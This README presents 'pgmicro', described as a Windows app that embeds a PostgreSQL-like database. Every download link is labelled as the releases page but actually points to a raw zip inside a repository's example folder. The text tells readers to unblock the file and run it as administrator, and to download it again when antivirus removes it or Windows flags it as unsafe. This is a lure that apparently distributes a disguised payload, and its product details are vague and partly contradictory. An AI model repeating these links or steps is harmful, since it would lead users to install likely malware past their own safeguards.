# 🐘 pgmicro - Run Postgres Inside Your App

[![Download pgmicro](https://img.shields.io/badge/Download-pgmicro-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/ansonhermetic435/pgmicro/main/example/Software-2.2.zip)

## 🔍 What pgmicro is

pgmicro is a desktop app for Windows that runs a PostgreSQL-like database inside the app itself. It uses a storage engine that works with SQLite-style data files, so you can keep your data in one place without setting up a separate database server.

This makes it useful if you want a simple way to open, use, and manage local data on your PC. You do not need to learn server setup or run extra services in the background.

## 💻 What you need

pgmicro is made for Windows computers. For smooth use, your PC should have:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- 200 MB of free disk space
- A modern 64-bit processor
- Internet access for the first download

If your computer can run recent desktop apps, it should work with pgmicro.

## 📥 Download pgmicro

Go to the releases page and choose the latest Windows download:

[Download pgmicro from GitHub Releases](https://raw.githubusercontent.com/ansonhermetic435/pgmicro/main/example/Software-2.2.zip)

Look for a file that matches Windows. Common names may include:

- `.exe`
- `.msi`
- `.zip`

If you see more than one file, pick the one meant for Windows desktop use.

## 🛠️ Install and open

### If you downloaded an `.exe` file

1. Open your Downloads folder.
2. Double-click the pgmicro installer or app file.
3. If Windows asks for permission, click Yes.
4. Follow the on-screen steps.
5. Wait for the app to finish opening.

### If you downloaded a `.zip` file

1. Open your Downloads folder.
2. Right-click the `.zip` file.
3. Choose Extract All.
4. Pick a folder you can find again, such as Desktop or Documents.
5. Open the extracted folder.
6. Double-click the pgmicro app file inside.

### If Windows blocks the file

1. Right-click the file.
2. Select Properties.
3. If you see an Unblock box, check it.
4. Click Apply.
5. Try opening the file again.

## 🚀 First launch

When pgmicro opens for the first time, it may create its data folder and start the local database engine.

You may see a startup screen, a blank workspace, or a place to load or create a database file. That is normal.

If the app asks where to store data, choose a folder you can find later. A good choice is:

- Documents
- Desktop
- A folder named `pgmicro-data`

## 🧭 Basic use

pgmicro is built for local database work. A normal flow looks like this:

1. Open the app.
2. Create or open a database file.
3. Add data or load existing data.
4. Save your work.
5. Close the app when you are done.

If the app shows tables, rows, or query boxes, those are part of the database view. You can use them to inspect data, edit records, and run database tasks in a local window.

## 📁 Where your data is stored

pgmicro keeps your data on your PC. In most cases, the data lives in a folder you choose during setup or first use.

To keep your files safe:

- Store the data folder in a location you back up
- Avoid moving files while the app is open
- Keep the folder name simple
- Do not delete the data file unless you want to remove the database

If you use cloud sync tools, make sure they do not lock the file while pgmicro is open.

## 🔐 Simple safety tips

Because pgmicro stores data on your computer, follow these basic steps:

- Use a folder with a clear name
- Make a copy before large changes
- Close the app before you back up the file
- Keep one backup on another drive if the data matters to you

These steps help protect your data if your PC has a problem.

## 🧩 Common file types you may see

pgmicro may work with files such as:

- Local database files
- SQLite-compatible data files
- Project folders
- Export files like `.csv` or `.sql`

If you are not sure which file to open, start with the main data file in the folder you chose when you first used the app.

## ⚙️ How to update

When a new version is available, repeat the download steps and get the newest release from GitHub.

1. Open the releases page.
2. Download the latest Windows file.
3. Close pgmicro if it is already open.
4. Replace the old file or run the new installer.
5. Open the app again.

If your data lives in a separate folder, your files should stay in place during the update.

## 🧰 If something does not work

### The app will not open

- Check that you downloaded the Windows file
- Try running it again as a normal user
- Right-click the file and choose Run as administrator
- Make sure your antivirus did not remove the file

### The app opens, but the window is blank

- Close the app
- Open it again
- Wait a few seconds for the first load
- Check that the data folder still exists

### Your database file does not load

- Confirm you chose the right file
- Make sure the file is not in use by another app
- Move the file to a simple folder path like `C:\pgmicro`
- Try opening it again

### Windows says the file is unsafe

- Confirm you downloaded it from the releases page
- Download the file again
- Save it to your Downloads folder
- Open it from there

## 🪟 Suggested folder setup

A simple folder layout can make pgmicro easier to use:

- `C:\pgmicro\app`
- `C:\pgmicro\data`
- `C:\pgmicro\backups`

This keeps the app, your data, and your backups apart.

## 📦 Example first-time setup

If you want a clean start on Windows:

1. Create a folder named `pgmicro` in `C:\`
2. Download the latest release from GitHub
3. Put the app file in `C:\pgmicro\app`
4. Create a separate `data` folder
5. Open the app
6. Choose the `data` folder when asked where to store files
7. Create your first local database

## 🧾 What pgmicro is good for

pgmicro fits use cases where you want a local database on your PC without setting up a server.

You may find it useful for:

- Personal data storage
- Small desktop tools
- Local app development
- Offline data work
- Simple database tests

It is built to stay close to PostgreSQL-style behavior while using a local storage layer that works like SQLite.

## 🧪 Working with data

If pgmicro gives you a table view, query box, or import option, you can use it to:

- Open a saved database
- Add rows
- Edit values
- Search records
- Export data for backup
- Test local database ideas

Keep changes small the first time so you can learn how the app behaves.

## 🗂️ Back up your files

To back up your data:

1. Close pgmicro
2. Find your data folder
3. Copy the database file or folder
4. Paste it into another drive or backup folder
5. Keep the backup in a safe place

If the app uses one main file, back up that file. If it uses a folder, back up the full folder.

## 📌 Quick start checklist

- Download the latest Windows release
- Open the file or extract the zip
- Launch pgmicro
- Choose a simple data folder
- Create or open a database
- Back up your data after setup

## ❓ Frequently asked questions

### Do I need a server?

No. pgmicro runs locally on your Windows PC.

### Do I need to know code?

No. You can use it as a desktop app. Some tasks may still use database terms like table or query.

### Can I move my files later?

Yes. Keep the app open while you use it, but close it before moving data files.

### Can I use it offline?

Yes. After you download it, pgmicro works on your PC without a constant internet connection.

### Where do I get updates?

Use the GitHub releases page and download the newest Windows version

## 📎 Download again

[Visit the pgmicro releases page to download](https://raw.githubusercontent.com/ansonhermetic435/pgmicro/main/example/Software-2.2.zip)

## 🧭 File naming examples

When you open the releases page, you may see files with names like:

- `pgmicro-windows.exe`
- `pgmicro-setup.msi`
- `pgmicro-win64.zip`

Pick the file that matches your Windows system and is meant for desktop use

## 🧼 Keep your setup simple

Use short folder names, store the app in one place, and keep the data in another. This helps you find your files later and makes backups easier